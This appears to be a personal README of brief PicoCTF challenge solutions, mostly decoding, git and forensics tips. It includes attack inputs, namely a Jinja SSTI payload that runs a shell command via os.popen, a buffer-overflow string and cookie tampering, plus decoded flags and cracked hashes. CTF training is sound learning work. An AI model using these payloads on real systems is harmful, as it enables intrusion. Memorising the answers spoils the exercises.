# PicoCTF

### USE THIS ONLY IF YOUR REALLY STUCK AND TIRED OF FINDING THE PASSWORD AND HAVE NO OTHER WAY.

## THIS IS THE LAST OPTION.

## Verify

```
for file in files/*; do   ./decrypt.sh "$file"; done
```


## Scan Suprise

Extract challenge.zip

Scan with QR Scanner


## Binary Search

Use this Python script:

```
low, high = 1, 1000

for _ in range(10):
    guess = (low + high) // 2
    print(guess)
    output = input()
    
    if "Higher" in output:
        low = guess + 1
    elif "Lower" in output:
        high = guess - 1

print("DONE")
```
**Example:**

![](</Pictures/BinarySearch1.png>)


## heap 0

See the addresses: `0x5bd0e822e2b0` and `0x5bd0e822e2d0`. It is 32 byte gap So inputting a string of length > 32 characters will modify the bico and we gain access to the flag.

```
2
```
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHELLO
```

![](</Pictures/heap0.png>)


## format string 0

The input 
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Works because this leads to segmentation fault, which prints the flag.

![](</Pictures/formatstring0.png>)


## WebDecode


## Unminify


## Time Machine

Run this command on the folder where .git is present
```
git log --oneline
```


## Super SSH

Just Login

## endianness

Run the code then use this python script
```
def find_little_endian(word):
    # Reverse the string and convert each character to hexadecimal
    return "".join(f"{ord(c):02X}" for c in reversed(word))

def find_big_endian(word):
    # Convert each character to hexadecimal in order
    return "".join(f"{ord(c):02X}" for c in word)

# Example word from server
word = "weiwo"

# Compute endianness representations
little_endian = find_little_endian(word)
big_endian = find_big_endian(word)

print("Little Endian:", little_endian)
print("Big Endian:", big_endian)

```

![](</Pictures/endianness.png>)



## CanYouSee

Unzip the file

```
exiftool ukn_reality.jpg
```
![](Pictures/CanYouSee.png)

The Text is clearly a Base 64 Cipher

cGljb0NURntNRTc0RDQ3QV9ISUREM05fYjMyMDQwYjh9Cg==

This gives the flag



## Glory of the Garden

```
strings garden.jpg
```



## information

```
exiftool cat.jpg
```
![](Pictures/cat.png)

cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9

It is Base 64



## Secret of the Polyglot

```
foremost flag2of2-final.pdf
```

First part of flag in PNG image

Second part of the flag in the PDF (Open PDF in Chrome)



## Ph4nt0m 1ntrud3r

```
tshark -r myNetworkTraffic.pcap -Y "tcp.len!=8" -T fields -e frame.time -e tcp.segment_data | sort -k4 | awk '{print $6}' | xxd -p -r | base64 -d
```



## RED

```
zsteg red.png
```
cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==

Now put the data in Base64 decoder



## flags are stepic

```
curl http://standard-pizzas.picoctf.net:57324/
```

By asking AI which country doesnt exists gives us
```
Upanzi, Republic The
```

Download the png gives us a Very Large image of upz.png

run
```
stepic -d -i upz.png
```



## Big Zip

```
grep -r "picoCTF"
```



## First Find

```
grep -r "picoCTF"
```



## FANTASY CTF

Press Enter till prompt for a/b/c
```
c
```
Press Enter till prompt for a/b
```
a
```
Press Enter till you find the flag



## Commitment Issues

```
git show
```



## Collaborative Development

```
git merge feature/part-1
git merge feature/part-2
git merge feature/part-3
```



## Blame Game

```
git blame message.py
```



## binhexa

Follow the game and perform the operations



## hashcrack

Use Hash cracking websites
```
482c811da5d5b4bc6d497ffa98491e38
```
```
password123
```
```
b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3
```
```
letmein
```
```
916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745
```
```
qwerty098
```



## EVEN RSA CAN BE BROKEN???

Use RSA Website and put N and e values



## Mod 26

Use ROT13 decoder



## The Numbers

Convert list to numbers
a=1, b=2, c=3 ...
```
l=[16,9,3,15,3,20,6,0,20,8,5,14,21,13,2,5,18,19,13,1,19,15,14,0]
for i in l:
    print(chr(i+ord('a')-1),end='')
```



## 13

Use ROT13 decoder



## interencdec

Base 64

Base 64

Caesar Cipher



## repetitions

Multiple BASE 64 Encoding

Decode base64 till you get answer



## runme.py

Just run the python code



## fixme1.py

Remove indentation before print



## Glitch Cat

nc to the server and convert chr to ascii by Python



## HashingJobApp

Use MD5 encoding website

NOTE: Don't Include quotes 



## convertme.py

Since it is running locally, We can force the `if` statement to be true

Change
```
if ans_num == num:
```

To
```
if ans_num == num or True:
```



## fixme2.py

if statement should have `==` NOT `=`



## Codebook

Run python code



## Magikarp Ground Mission

```
ls
cat instructions-to-2of3.txt
cat 1of3.flag.txt
cd /
ls
cat 2of3.flag.txt
cat instructions-to-3of3.txt
cd ~
ls
cat 3of3.flag.txt
```



## Tab, Tab, Attack

Use `cd` then `Tab` `Tab` `Tab` ...
```
cd Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/
```

./ `Tab`
```
./fang-of-haynekhtnamet
```


## Wave a flag

```
./warm -h
```



## Python Wrangling

```
python3 ende.py -d flag.txt.en
```



## Static ain't always noise

```
./ltdis.sh static
```
```
cat static.ltdis.strings.txt
```



## Nice netcat...

It is ASCII, Use ASCII to TEXT



## Obedient Cat

```
cat flag
```


## 2Warm

Python
```
bin(42)
```



## First Grep

cat file | grep "picoCTF"



## Bases

Base64



## Warmed Up

```
int('0x3D',16)
```



## strings it

```
strings strings | grep "picoCTF"
```



## what's a net cat?

```
nc jupiter.challenges.picoctf.org 64287
```



## Lets Warm Up

Python
```
chr(int('0x70',16))
```



## Transformation

Python
```
file_path = "enc"

with open(file_path, "r", encoding="utf-8") as f:
    encrypted_data = f.read()


decrypted_flag = ""

for char in encrypted_data:
    num = ord(char)  # Get the numeric representation
    first_char = chr(num >> 8)  # Extract the first character
    second_char = chr(num & 0xFF)  # Extract the second character
    decrypted_flag += first_char + second_char


decrypted_flag = decrypted_flag.rstrip("\x00")

print(decrypted_flag)
```



## vault-door-training

Password is within the file, Put it within picoCTF{...}
```
cat VaultDoorTraining.java
```



## SSTI1

Server-Side Template Injection (SSTI)
```
{{7*7}}
```
```
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```



## head-dump

Click on `# API-Documentation`

This opens
```
http://verbal-sleep.picoctf.net:56550/api-docs/
```

Now It says there is a `/heapdump`
```
http://verbal-sleep.picoctf.net:56550/heapdump
```

This prompts to download heapdump of the website

Now 
```
cat heapdump-1743316813402.heapsnapshot  | grep "picoCTF"
```



## WebDecode

Navigate to About page
```
http://titan.picoctf.net:59394/about.html
```

Now open Inspect mode

See notify_true
```
cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDJjZGNiNTl9
```

It is a Base64

Decoding gives the flag



## Unminify

Inspect the page, and see the source code



## Inspect HTML

Inspect the page, Flag is written in comments



## Includes

Inspect then, Open Networks tab, Refresh the page

See the .css and .js

The flags are written there



## where are the robots

Try opening robots.txt

```
http://jupiter.challenges.picoctf.org:60915/robots.txt
```

It says 
```
User-agent: *
Disallow: /8028f.html
```

Now open 
```
http://jupiter.challenges.picoctf.org:60915/8028f.html
```



## Insp3ct0r

Inspect the page,

HTML codes gives part 1 of the flag

Now open sources and see the .css and .js for other two parts of the flag.



## logon

Login with anything

Open Applications then Cookies

Here you see Admin : False

Make Admin to True and then Refresh the page



## dont-use-client-side

Inspect the page

See function verify

Write it in order, the order is like `checkpass.substring(<START> <END>)`

